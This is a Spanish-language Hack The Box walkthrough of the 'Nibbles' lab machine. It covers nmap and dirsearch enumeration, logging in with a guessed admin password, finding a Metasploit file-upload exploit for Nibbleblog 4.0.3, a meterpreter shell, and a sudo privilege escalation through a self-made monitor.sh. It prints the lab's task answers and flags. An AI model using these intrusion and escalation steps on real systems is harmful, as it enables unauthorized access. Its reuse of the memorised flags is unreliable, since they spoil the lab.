---
title: Nibbles
date: 2025-11-15 11:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, nibbles, web, nibblesblog, metasploit]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/344a8f99e8f7dddfed764f791e2731df.png
    alt: Hack The Box
---

## Task1

How many open TCP ports are listening on Nibbles?

No voy a poner todo el scaneo de nmap por dos puertos,  nada especial

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ nmap -p- 10.129.96.84 -v
```
Este escaneo nos muestra dos puertos el 22 y el 80

> 2

## Task 2

What is the relative path on the webserver to a blog?


Se accede a http://10.129.96.84 
En el código fuente de la web contiene información sobre el contenido /nibbleblog/

> /nibbleblog

## Task3

What content management system (CMS) is being used by the blog??

> Nibbleblog

## Task4

What is the relative path to an XML file that contains the admin username?

Ejecutando dirsearch  encontramos información relevante que al explorar nos muestra varios ficheros y rutas importantes, además tenemos acceso a esos ficheros . Para este reto debemos visitar tanto la página que nos redirecciona, como 
el propio admin.php. 

``` shell
dirsearch -u "http://10.129.96.84/nibbleblog"
[14:49:35] 301 -  323B  - /nibbleblog/admin  ->  http://10.129.96.84/nibbleblog/admin/
[14:49:36] 200 -  606B  - /nibbleblog/admin.php                             
[14:49:36] 200 -  521B  - /nibbleblog/admin/                                
[14:49:36] 301 -  334B  - /nibbleblog/admin/js/tinymce  ->  http://10.129.96.84/nibbleblog/admin/js/tinymce/
[14:49:36] 200 -  568B  - /nibbleblog/admin/js/tinymce/                     
[14:49:52] 301 -  325B  - /nibbleblog/content  ->  http://10.129.96.84/nibbleblog/content/
[14:49:52] 200 -  489B  - /nibbleblog/content/                              
[14:49:52] 200 -  724B  - /nibbleblog/COPYRIGHT.txt                         
[14:50:08] 200 -   92B  - /nibbleblog/install.php                           
[14:50:08] 200 -   92B  - /nibbleblog/install.php?profile=default           
[14:50:10] 301 -  327B  - /nibbleblog/languages  ->  http://10.129.96.84/nibbleblog/languages/
[14:50:11] 200 -   12KB - /nibbleblog/LICENSE.txt                           
[14:50:23] 200 -  698B  - /nibbleblog/plugins/                              
[14:50:23] 301 -  325B  - /nibbleblog/plugins  ->  http://10.129.96.84/nibbleblog/plugins/
[14:50:26] 200 -    5KB - /nibbleblog/README                                
[14:50:37] 200 -  503B  - /nibbleblog/themes/                               
[14:50:37] 301 -  324B  - /nibbleblog/themes  ->  http://10.129.96.84/nibbleblog/themes/
```

> /nibbleblog/content/private/users.xml


## Task5

What is the admin user's password to log into the blog?


Parece que el administrado a usado una contraseña que está escrita en la web. 

> nibbles

## Task6

What version of nibble blog is running on the target machine? Do not include the "v".

Una vez nos logamos, si exploramos la paǵina nos vamos a encontrar esta URL. Ahí esta la versión.
http://10.129.70.137/nibbleblog/admin.php?controller=settings&action=general

> 4.0.3

## Task7

What is the 2015 CVE ID for an authenticated code execution by file upload vulnerability in this version of NibbleBlog.

Tirando de Metasploit encontraremos un exploit para este software,  

```shell
msf > search nibble

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability

```

Buscamos el CVE en Internet, yo he ido un poquito más alla y he leído el código del exploit para Metasploit por si os apetece leerlo
[https://www.exploit-db.com/exploits/38489](https://www.exploit-db.com/exploits/38489)


> CVE-2015-6967

## Task8

Which user the Nibbleblog instance is running on the target machine?

``` shell
meterpreter > shell
Process 1648 created.
Channel 0 created.
ls
db.xml
echo $USER
nibbler
```

> nibbler

## Task 9

Submit the flag located in the nibbler user's home directory.

``` shell 
cat /home/nibbler/user.txt
1204abbc941a5a0229c82118980223a6
```

> 1204abbc941a5a0229c82118980223a6

## Task 10

What is the name of the script that nibbler can run as root on Nibbles?

Como estas máquinas ya sabemos que normalmente nos piden elevar privilegios hasta tener usuario root, una técnica que ya vimos
en un reto anterior para elevarnos privilegios es ver si el usuario que hemos comprometido tiene algun permiso para ejecutar 
algún archivo con permisos elevados, en sistemas GNU/Linux es muy recomendable listar algunos de estos comandos con otro comando **sudo -l**

``` shell
meterpreter > shell
/usr/bin/sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Y encontramos un supuesto script que podríamos ejecutar con permisos elevados, hay un inconventiente, el script y la ruta no existen pero no hay nada que nos impida crearlos manualmente. 

> monitor.sh

## Task 11

Enter the permission set on monitor.sh? Use the Linux file permissions format, like -rw-rw-r--.

No estoy muy de acuerdo con la respuesta pues se podría mantener la ejecución con distintos permisos, aunque esencialmente supongo que lo mínimo sería -rwx-rw-rwx

> -rwxrwxrwx

Submit Root flag

``` shell
mkdir /home/nibbler/personal
mkdir /home/nibbler/personal/stuff/
echo "/bin/bash" > /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
whoami
root
cat /root/root.txt
73ae2383522fb8e650e79176d5b1e598
```

Para hacer real el archivo lo creamos y lo ejecutamos con sudo, convirtiendonos en root. 

> 73ae2383522fb8e650e79176d5b1e598

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/121)